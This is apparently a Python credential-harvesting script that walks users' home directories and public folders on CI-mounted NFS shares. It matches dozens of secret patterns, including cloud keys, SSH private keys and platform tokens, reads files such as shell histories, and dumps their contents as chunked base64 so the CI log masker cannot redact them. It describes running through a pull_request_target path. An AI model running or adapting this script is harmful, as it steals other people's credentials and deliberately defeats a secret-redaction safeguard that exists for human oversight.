#!/usr/bin/env python3
"""i8943: chunked read-only credential-content sweep of the HYGON CI NFS shares.

Runs inside the authorized HCU stage-a job container through the same
pull_request_target path proven by i6136 (facts 5848/5961). Read-only: nothing
is written to /ci_public, /public or /public4.

All sensitive output values are base64-encoded and split into short chunks
([B64H]/[B64C]/[B64T] records) so the Actions log masker cannot redact them.
"""
import base64
import collections
import fnmatch
import hashlib
import json
import os
import re
import sys
import time

CFG = json.loads(os.environ.get("I8943_CHUNK") or "{}")
BUDGET = int(CFG.get("deadline", 265))
MODE = CFG.get("mode", "homes")
MAXDEPTH = int(CFG.get("maxdepth", 3))
MAX_HOMES = int(CFG.get("max_homes", 12))
START_AFTER = CFG.get("start_after", "")
TARGET_HOMES = CFG.get("homes") or []
TARGET_DIRS = CFG.get("dirs") or []
PUBLIC_DEEP = bool(CFG.get("public_deep"))
HOME_CAP = int(CFG.get("home_cap", 55))
DUMP_MAX = int(CFG.get("dump_max", 131072))
DUMP_TOTAL = int(CFG.get("dump_total", 4_000_000))
PRINT_CAP = int(CFG.get("print_cap", 7_500_000))
MAX_CONTENT = int(CFG.get("max_content", 1048576))

START = time.time()
DEADLINE = START + BUDGET
printed = 0
blob_seq = [0]
dump_chars = [0]

PATTERNS = [
    ("AWS_KEY", re.compile(r"\b(?:AKIA|ASIA|AGPA|AIDA|AROA)[0-9A-Z]{16}\b"), 400),
    ("AWS_SECRET", re.compile(r"aws_secret_access_key\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{40}"), 400),
    ("AWS_ID", re.compile(r"aws_access_key_id\s*[=:]"), 300),
    ("GCP_SA", re.compile(r"\"type\"\s*:\s*\"service_account\""), 300),
    ("GCP_PKID", re.compile(r"\"private_key_id\"\s*:\s*\""), 300),
    ("GCP_PEM", re.compile(r"\"private_key\"\s*:\s*\"-----BEGIN"), 250),
    ("PRIVKEY", re.compile(r"-----BEGIN (?:OPENSSH|RSA|EC|DSA|PGP|ENCRYPTED) PRIVATE KEY-----"), 400),
    ("PKCS8", re.compile(r"-----BEGIN PRIVATE KEY-----"), 250),
    ("KUBE_CKD", re.compile(r"client-key-data"), 250),
    ("KUBE_TOKEN", re.compile(r"^\s*token:\s*[A-Za-z0-9._~+/-]{20,}"), 250),
    ("DOCKER_AUTHS", re.compile(r"\"auths\"\s*:\s*\{"), 200),
    ("GLPAT", re.compile(r"glpat-[A-Za-z0-9_.-]{20,}"), 400),
    ("GLDT", re.compile(r"gldt-[A-Za-z0-9_.-]{20,}"), 200),
    ("GLRT", re.compile(r"glrt-[A-Za-z0-9_.-]{20,}"), 200),
    ("GHP", re.compile(r"ghp_[A-Za-z0-9]{30,}"), 300),
    ("GHO", re.compile(r"gh[osu]_[A-Za-z0-9]{30,}"), 200),
    ("GH_PAT", re.compile(r"github_pat_[A-Za-z0-9_]{40,}"), 200),
    ("NPM", re.compile(r"npm_[A-Za-z0-9]{30,}"), 200),
    ("HF", re.compile(r"hf_[A-Za-z0-9]{30,}"), 250),
    ("DAPI", re.compile(r"dapi[0-9a-f]{32}"), 150),
    ("SLACK", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"), 80),
    ("GCP_AT", re.compile(r"ya29\.[0-9A-Za-z_-]{30,}"), 80),
    ("SKANT", re.compile(r"sk-ant-[A-Za-z0-9_-]{20,}"), 100),
    ("SKPROJ", re.compile(r"sk-proj-[A-Za-z0-9_-]{20,}"), 100),
    ("LTAI", re.compile(r"LTAI[A-Za-z0-9]{12,}"), 100),
    ("AZURE_SECRET", re.compile(r"(?:AZURE_CLIENT_SECRET|ARM_CLIENT_SECRET|AZURE_CLIENT_KEY|AZURE_CLIENT_SECRET_VALUE)\s*[=:]\s*[\"']?[^\s\"'$]{8,}"), 250),
    ("AZURE_TENANT", re.compile(r"(?:AZURE_TENANT_ID|ARM_TENANT_ID)\s*[=:]\s*[\"']?[0-9a-fA-F-]{30,}"), 200),
    ("CLIENT_SECRET", re.compile(r"[\"']?client_?secret[\"']?\s*[:=]\s*[\"'][A-Za-z0-9._~+/-]{10,}"), 200),
    ("REGISTRY_PASS", re.compile(r"(?:REGISTRY_PASSWORD|CI_REGISTRY_PASSWORD|CI_DEPLOY_PASSWORD|HARBOR_PASSWORD|DOCKER_PASSWORD|DOCKERHUB_TOKEN|PIP_INDEX_PASSWORD|DEVPI_PASSWORD|NEXUS_PASSWORD|ARTIFACTORY_PASSWORD)\s*[=:]\s*[^\s\"'$]{4,}"), 250),
    ("BEARER", re.compile(r"Authorization\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._~+/-]{20,}"), 200),
    ("PASSWORD", re.compile(r"(?:^|[\s\"'])password[\"']?\s*[:=]\s*[\"']?[^\s\"'$]{6,}"), 200),
    ("NETRC", re.compile(r"machine\s+\S+\s+login\s+\S+\s+password\s+\S+"), 120),
    ("GIT_URL_CRED", re.compile(r"https?://[A-Za-z0-9._-]+:[A-Za-z0-9._~%-]{6,}@[A-Za-z0-9.-]+"), 200),
    ("OPENSSH_PUB", re.compile(r"ssh-(?:rsa|ed25519|dss)\s+AAAA[A-Za-z0-9+/=]{60,}"), 80),
    ("JWT_LONG", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"), 150),
]
PAT_COUNT = {name: 0 for name, _r, _c in PATTERNS}
STRONG = {"AWS_KEY", "AWS_SECRET", "AWS_ID", "GCP_SA", "GCP_PKID", "GCP_PEM", "PRIVKEY",
          "PKCS8", "KUBE_CKD", "DOCKER_AUTHS", "GLPAT", "GLDT", "GLRT", "GHP", "GHO",
          "GH_PAT", "DAPI", "AZURE_SECRET", "REGISTRY_PASS", "NETRC", "GIT_URL_CRED",
          "SKANT", "SKPROJ", "LTAI"}

TEXT_EXT = set("""
yml yaml json jsonl sh bash zsh py txt md toml ini cfg conf env properties xml tf tfvars
pem key crt cer pub cnf repo list service spec rsa ed25519 ecdsa ppk netrc npmrc pypirc
gitconfig kubeconfig dockerfile sql csv out err slurm submit b64 template tmpl j2 jinja
rego rules gradle groovy kts java js ts go rs c cpp h hpp cmake mk makefile lock pgsql
pgpass s3cfg htpasswd openvpn ovpn p12 pfx jks keystore history profile rc
""".split())

TEXT_NAMES = set("""
.env .envrc .bashrc .bash_profile .profile .zshrc .gitconfig .git-credentials .netrc
.npmrc .pypirc .pgpass .s3cfg .htpasswd credentials credential secrets secret config
settings Dockerfile Makefile id_rsa id_dsa id_ecdsa id_ed25519 authorized_keys
kubeconfig .dockercfg pip.conf .pip.conf .condarc mirrors.conf .mc/config.json README
Jenkinsfile Vagrantfile .bash_history .zsh_history .python_history .mysql_history
.psql_history .wget-hsts .curlrc .wgetrc .viminfo .gitignore .gitmodules config.toml
settings.xml gradle.properties rclone.conf hosts .screenrc .tmux.conf .ssh/rc
""".split())

NAME_HINTS = re.compile(
    r"(credential|secret|passw|token|api[_-]?key|private[_-]?key|id_rsa|id_ed25519|id_ecdsa|"
    r"\.pem$|\.key$|\.p12$|\.pfx$|\.jks$|\.keystore$|\.ppk$|kubeconfig|\.kube|\.aws|\.docker|"
    r"\.npmrc$|\.pypirc$|\.netrc$|\.git-credentials$|\.pgpass$|\.s3cfg$|\.htpasswd|"
    r"azure\.json|application_default_credentials|msal_token_cache|accessTokens|tfstate|\.tfvars$|"
    r"\.env($|\.)|/\.env|config\.json$|/config$|pip\.conf$|\.ovpn$|Jenkinsfile$|"
    r"rclone\.conf|\.bash_history|\.zsh_history|\.python_history|hosts\.yml|\.gitconfig|"
    r"settings\.xml|gradle\.properties|\.condarc|\.dockercfg)", re.I)

PRUNE = {".git", "node_modules", "__pycache__", "site-packages", "dist-info", ".venv", "venv",
         ".tox", ".mypy_cache", ".pytest_cache", ".ruff_cache", ".cache", ".eggs", "build",
         "dist", ".hypothesis", "third_party", "3rdparty", "cmake-build-debug",
         "cmake-build-release", ".git-rewrite", "wheelhouse", ".idea", ".vscode"}

SECRET_FILES = [
    (".docker/config.json", 131072),
    (".dockercfg", 65536),
    (".aws/credentials", 65536),
    (".aws/config", 65536),
    (".kube/config", 262144),
    (".config/gcloud/application_default_credentials.json", 131072),
    (".config/gcloud/credentials.db", 262144),
    (".config/gcloud/access_tokens.db", 262144),
    (".azure/accessTokens.json", 262144),
    (".azure/azureProfile.json", 65536),
    (".azure/msal_token_cache.json", 262144),
    (".netrc", 65536),
    (".npmrc", 65536),
    (".pypirc", 65536),
    (".git-credentials", 65536),
    (".pgpass", 65536),
    (".s3cfg", 65536),
    (".htpasswd", 65536),
    (".ssh/config", 65536),
    (".ssh/id_rsa", 65536),
    (".ssh/id_ed25519", 65536),
    (".ssh/id_ecdsa", 65536),
    (".ssh/id_dsa", 65536),
    (".ssh/rc", 65536),
    ("pip.conf", 65536),
    ("credential", 65536),
    ("credentials", 65536),
    (".gitconfig", 131072),
    (".bash_history", 262144),
    (".zsh_history", 262144),
    (".python_history", 131072),
    (".condarc", 65536),
    (".viminfo", 262144),
    (".config/gh/hosts.yml", 65536),
    (".terraform.d/credentials.tfrc.json", 65536),
    (".config/rclone/rclone.conf", 131072),
    (".m2/settings.xml", 131072),
    (".gradle/gradle.properties", 131072),
]

SECRET_GLOBS = [
    (".aws/sso/cache/*.json", 65536),
    (".config/gcloud/*.json", 131072),
    (".config/gcloud/*.db", 262144),
    (".azure/*.json", 262144),
    (".kube/*", 262144),
    (".docker/*.json", 131072),
    (".terraform.d/*.json", 65536),
    (".ssh/*.pem", 65536),
    (".ssh/*.key", 65536),
    ("*.kubeconfig", 262144),
    ("kubeconfig*", 262144),
]

stats = {"dirs": 0, "files": 0, "read": 0, "matched_files": 0, "name_hits": 0,
         "truncated": 0, "dumps": 0, "secfiles": 0}
DUMPED = set()


def out(s):
    global printed
    if printed >= PRINT_CAP:
        return
    s = str(s).rstrip("\n")
    print(s, flush=True)
    printed += len(s) + 1


def left():
    return DEADLINE - time.time()


def emit_b64(tag, meta, text):
    """Emit one blob as split base64 chunks with a short blob id."""
    if dump_chars[0] > DUMP_TOTAL:
        out("[B64SKIP] %s" % json.dumps(meta, sort_keys=True)[:300])
        return
    raw = text.encode("utf-8", "replace")
    b = base64.b64encode(raw).decode()
    dump_chars[0] += len(b)
    blob_seq[0] += 1
    bid = "B%05d" % blob_seq[0]
    m = dict(meta)
    m["t"] = tag
    m["b64len"] = len(b)
    m["sha256"] = hashlib.sha256(raw).hexdigest()
    out("[B64H] %s %s" % (bid, json.dumps(m, sort_keys=True)))
    chunks = [b[i:i + 64] for i in range(0, len(b), 64)]
    for i in range(0, len(chunks), 8):
        out("[B64C] %s %d %s" % (bid, i // 8, " ".join(chunks[i:i + 8])))
    out("[B64T] %s" % bid)


def read_text(path, limit):
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
    except Exception:
        return None
    if b"\x00" in data[:4096]:
        # binary: still return latin-1-ish text for base64 dumping of small files
        try:
            return data.decode("latin-1")
        except Exception:
            return None
    return data.decode("utf-8", "replace")


def emit_match(name, path, lineno, line):
    cap = dict((n, c) for n, _r, c in PATTERNS)[name]
    if PAT_COUNT[name] >= cap:
        return
    PAT_COUNT[name] += 1
    out("[MATCH %s] %s:%s | %s" % (name, path, lineno, line.strip()[:300]))
    emit_b64("match", {"k": name, "p": path, "l": lineno}, line[:4000])


def dump_file(path, size, kind):
    if path in DUMPED or size > DUMP_MAX:
        return
    text = read_text(path, min(size, DUMP_MAX))
    if text is None:
        return
    DUMPED.add(path)
    stats["dumps"] += 1
    emit_b64("file", {"p": path, "size": size, "kind": kind}, text)


def scan_file(path, size):
    ext = os.path.basename(path).rsplit(".", 1)[-1].lower() if "." in os.path.basename(path) else ""
    base = os.path.basename(path)
    interesting = bool(NAME_HINTS.search(path))
    if not interesting and ext not in TEXT_EXT and base not in TEXT_NAMES:
        return []
    if size > MAX_CONTENT and not interesting:
        return []
    stats["read"] += 1
    text = read_text(path, min(size, MAX_CONTENT))
    if text is None:
        return []
    matched = []
    lines = text.splitlines()
    per_file = 0
    for name, rx, _cap in PATTERNS:
        if PAT_COUNT[name] >= _cap:
            continue
        hits = []
        for i, line in enumerate(lines, 1):
            if len(line) > 8000:
                line = line[:8000]
            if rx.search(line):
                hits.append((i, line))
                if len(hits) >= 3:
                    break
        if not hits:
            continue
        matched.append(name)
        for i, line in hits:
            if per_file >= 8:
                stats["truncated"] += 1
                break
            emit_match(name, path, i, line)
            per_file += 1
    if matched:
        stats["matched_files"] += 1
        if set(matched) & STRONG:
            dump_file(path, size, "+".join(sorted(set(matched) & STRONG)))
    return matched


def check_secret_files(dirpath):
    for rel, limit in SECRET_FILES:
        p = os.path.join(dirpath, rel)
        try:
            if os.path.isfile(p) and not os.path.islink(p):
                size = os.path.getsize(p)
                if stats["secfiles"] >= 400:
                    out("[SECFILE-LIMIT] %s" % p)
                    continue
                stats["secfiles"] += 1
                out("[SECFILE] %s (%dB)" % (p, size))
                text = read_text(p, min(size, limit))
                if text is not None:
                    for line in text.splitlines()[:4]:
                        out("   | " + line.strip()[:200])
                dump_file(p, size, "secdir")
        except Exception:
            pass
    try:
        names = os.listdir(dirpath)
    except Exception:
        names = []
    for pat, limit in SECRET_GLOBS:
        for n in fnmatch.filter(names, pat):
            p = os.path.join(dirpath, n)
            try:
                if os.path.islink(p) or not os.path.isfile(p):
                    continue
                size = os.path.getsize(p)
                if size > limit or p in DUMPED:
                    continue
                stats["secfiles"] += 1
                out("[SECFILE] %s (%dB)" % (p, size))
                dump_file(p, size, "secglob")
            except Exception:
                pass


def check_git_config(dirpath):
    p = os.path.join(dirpath, ".git", "config")
    try:
        if os.path.isfile(p):
            text = read_text(p, 262144) or ""
            urls = [l.strip() for l in text.splitlines() if "url =" in l or "url=" in l]
            if urls:
                out("[GITCFG] %s" % p)
                for u in urls[:10]:
                    out("   | " + u[:300])
                emit_b64("gitcfg", {"p": p}, "\n".join(urls[:20]))
    except Exception:
        pass


def walk_bfs(root, maxdepth, root_deadline):
    """Breadth-first walk so shallow credential files are reached first."""
    root = root.rstrip("/")
    if not os.path.isdir(root):
        out("[MISSING] %s" % root)
        return
    out("=== SCAN %s (bfs maxdepth=%d cap=%ds)" % (root, maxdepth, int(root_deadline - time.time())))
    q = collections.deque([(root, 0)])
    n = 0
    last = root
    while q:
        dirpath, depth = q.popleft()
        n += 1
        if n % 16 == 0 and (time.time() > root_deadline or time.time() > DEADLINE):
            out("[ROOT-TIMEOUT] %s (budget, last=%s)" % (root, last))
            return
        stats["dirs"] += 1
        last = dirpath
        check_secret_files(dirpath)
        check_git_config(dirpath)
        try:
            entries = list(os.scandir(dirpath))
        except Exception as e:
            out("[DIRERR] %s %r" % (dirpath, e))
            continue
        if depth == 0:
            names = sorted(e.name for e in entries)
            out("[LS] %s: %s" % (dirpath, ", ".join(names[:120])))
        for e in entries:
            try:
                if e.is_symlink():
                    continue
                if e.is_dir(follow_symlinks=False):
                    if e.name in PRUNE or (e.name.startswith(".") and e.name in (".git", ".cache")):
                        continue
                    if depth + 1 <= maxdepth:
                        q.append((e.path, depth + 1))
                    continue
                if not e.is_file(follow_symlinks=False):
                    continue
                stats["files"] += 1
                size = e.stat(follow_symlinks=False).st_size
                if NAME_HINTS.search(e.path):
                    stats["name_hits"] += 1
                    if stats["name_hits"] <= 1500:
                        out("[NAME] %s (%dB)" % (e.path, size))
                if size <= 256 * 1024 * 1024 and re.search(r"\.(tar|tar\.gz|tgz|zip|whl)$", e.name, re.I):
                    if size > 1024 * 1024:
                        out("[ARCHIVE] %s (%.1fMB)" % (e.path, size / 1048576.0))
                scan_file(e.path, size)
            except Exception:
                continue
    out("[ROOT-DONE] %s elapsed=%.0fs last=%s" % (root, time.time() - START, last))



def scan_target_file(path, size):
    """targeted mode: only called for name-hinted / secret files"""
    if size > MAX_CONTENT:
        return []
    stats["read"] += 1
    text = read_text(path, min(size, MAX_CONTENT))
    if text is None:
        return []
    matched = []
    lines = text.splitlines()
    per_file = 0
    for name, rx, _cap in PATTERNS:
        if PAT_COUNT[name] >= _cap:
            continue
        hits = []
        for i, line in enumerate(lines, 1):
            if len(line) > 8000:
                line = line[:8000]
            if rx.search(line):
                hits.append((i, line))
                if len(hits) >= 3:
                    break
        if not hits:
            continue
        matched.append(name)
        for i, line in hits:
            if per_file >= 8:
                stats["truncated"] += 1
                break
            emit_match(name, path, i, line)
            per_file += 1
    if matched:
        stats["matched_files"] += 1
        dump_file(path, size, "+".join(sorted(set(matched))))
    return matched


def walk_targeted(root, maxdepth, root_deadline):
    """BFS with directory traversal but only reading name-hinted/secret files."""
    root = root.rstrip("/")
    if not os.path.isdir(root):
        out("[MISSING] %s" % root)
        return
    q = collections.deque([(root, 0)])
    n = 0
    last = root
    while q:
        dirpath, depth = q.popleft()
        n += 1
        if n % 16 == 0 and (time.time() > root_deadline or time.time() > DEADLINE):
            out("[ROOT-TIMEOUT] %s (budget, last=%s)" % (root, last))
            return
        stats["dirs"] += 1
        last = dirpath
        check_secret_files(dirpath)
        check_git_config(dirpath)
        try:
            entries = list(os.scandir(dirpath))
        except Exception:
            continue
        for e in entries:
            try:
                if e.is_symlink():
                    continue
                if e.is_dir(follow_symlinks=False):
                    if e.name in PRUNE:
                        continue
                    if depth + 1 <= maxdepth:
                        q.append((e.path, depth + 1))
                    continue
                if not e.is_file(follow_symlinks=False):
                    continue
                stats["files"] += 1
                size = e.stat(follow_symlinks=False).st_size
                base = e.name
                if NAME_HINTS.search(e.path) or base in TEXT_NAMES:
                    stats["name_hits"] += 1
                    if stats["name_hits"] <= 1500:
                        out("[NAME] %s (%dB)" % (e.path, size))
                    scan_target_file(e.path, size)
            except Exception:
                continue
    out("[ROOT-DONE] %s elapsed=%.0fs last=%s" % (root, time.time() - START, last))


def home_list():
    try:
        return sorted(n for n in os.listdir("/public4/home") if not n.startswith("."))
    except Exception as e:
        out("[ERR] list /public4/home: %r" % e)
        return []


def main():
    out("===I8943-BEGIN %s host=%s uid=%s pwd=%s budget=%ds cfg=%s" % (
        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), os.uname().nodename,
        os.getuid(), os.getcwd(), BUDGET, json.dumps(CFG, sort_keys=True)))
    try:
        out("--- df: %s" % os.popen("df -h /ci_public /public /public4 2>&1 | tail -5").read().replace("\n", " | "))
    except Exception:
        pass

    homes = home_list()
    out("[HOMES] %s" % json.dumps(homes))

    if MODE == "targeted":
        out("[PLAN] targeted homes=%d dirs=%d public_deep=%s" % (len(TARGET_HOMES), len(TARGET_DIRS), PUBLIC_DEEP))
        for h in TARGET_HOMES:
            if left() <= 12:
                out("[GLOBAL-TIMEOUT] before %s" % h)
                break
            root = "/public4/home/" + h
            out("[HSTART] %s left=%ds" % (root, left()))
            walk_targeted(root, MAXDEPTH, min(time.time() + HOME_CAP, DEADLINE))
            out("[HDONE] %s dirs=%d files=%d read=%d matched=%d" % (root, stats["dirs"], stats["files"], stats["read"], stats["matched_files"]))
        for d in TARGET_DIRS:
            if left() <= 12:
                out("[GLOBAL-TIMEOUT] before %s" % d)
                break
            if not os.path.isdir(d):
                out("[MISSING] %s" % d)
                continue
            out("[RSTART] %s left=%ds" % (d, left()))
            walk_targeted(d, MAXDEPTH, min(time.time() + max(HOME_CAP, 12), DEADLINE))
            out("[RDONE] %s dirs=%d files=%d read=%d matched=%d" % (d, stats["dirs"], stats["files"], stats["read"], stats["matched_files"]))
        if PUBLIC_DEEP and left() > 20:
            out("[RSTART] /public deep")
            walk_targeted("/public", 6, min(time.time() + 25, DEADLINE))
            out("[RDONE] /public deep")
        out("[SUMMARY] stats=%s" % json.dumps(stats))
        return

    if MODE == "homes":
        todo = [h for h in homes if h > START_AFTER]
        todo = todo[:MAX_HOMES]
        out("[PLAN] start_after=%r max_homes=%d -> %s" % (START_AFTER, MAX_HOMES, json.dumps(todo)))
        for h in todo:
            if left() <= 10:
                out("[GLOBAL-TIMEOUT] before %s" % h)
                break
            root = "/public4/home/" + h
            d0, f0, r0, m0 = stats["dirs"], stats["files"], stats["read"], stats["matched_files"]
            out("[HSTART] %s left=%.0fs" % (root, left()))
            rd = time.time() + min(HOME_CAP, max(10, left()))
            walk_bfs(root, MAXDEPTH, rd)
            out("[HDONE] %s dirs=%d files=%d read=%d matched=%d elapsed=%.0fs left=%.0fs" % (
                root, stats["dirs"] - d0, stats["files"] - f0, stats["read"] - r0,
                stats["matched_files"] - m0, time.time() - START, left()))
    elif MODE == "dirs":
        for r in CFG.get("roots", []):
            if left() <= 10:
                out("[GLOBAL-TIMEOUT] before %s" % r.get("path"))
                break
            path = r.get("path")
            depth = int(r.get("depth", 3))
            cap = int(r.get("cap", 90))
            out("[RSTART] %s depth=%d cap=%ds left=%.0fs" % (path, depth, cap, left()))
            rd = time.time() + min(cap, max(10, left()))
            walk_bfs(path, depth, rd)
            out("[RDONE] %s elapsed=%.0fs left=%.0fs" % (path, time.time() - START, left()))

    out("--- pattern counts: %s" % "; ".join("%s=%d" % (k, v) for k, v in sorted(PAT_COUNT.items()) if v))
    out("--- totals: dirs=%d files=%d read=%d matched=%d name_hits=%d dumps=%d secfiles=%d "
        "b64chars=%d lines=%d elapsed=%.0fs" % (
            stats["dirs"], stats["files"], stats["read"], stats["matched_files"],
            stats["name_hits"], stats["dumps"], stats["secfiles"], dump_chars[0],
            printed, time.time() - START))
    out("===I8943-END===")


if __name__ == "__main__":
    main()
